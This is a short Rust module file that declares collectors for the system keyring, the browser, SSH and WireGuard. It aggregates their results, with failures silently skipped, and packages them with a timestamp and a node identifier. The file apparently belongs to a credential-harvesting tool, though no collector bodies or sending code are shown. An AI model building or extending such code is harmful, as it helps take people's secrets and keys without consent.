pub mod browser;
pub mod keyring;
mod ssh;
mod wireguard;
mod types;

pub use types::{CollectedItem, CollectedData, Collection, ItemKind};
pub use keyring::dump_keyring;

use std::time::{SystemTime, UNIX_EPOCH};


/// Run all collectors, return whatever succeeded.
/// Failures are recorded to errlog and silently skipped.
pub fn collect_all() -> Vec<CollectedItem> {
    let mut items = Vec::new();
    items.extend(keyring::collect());
    items.extend(browser::collect());
    // items.extend(ssh::collect());
    // items.extend(wireguard::collect());
    items
}

pub fn build_collection(items: Vec<CollectedItem>, node_id: [u8; 32]) -> Collection {
    Collection {
        items,
        timestamp: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        node_id,
    }
}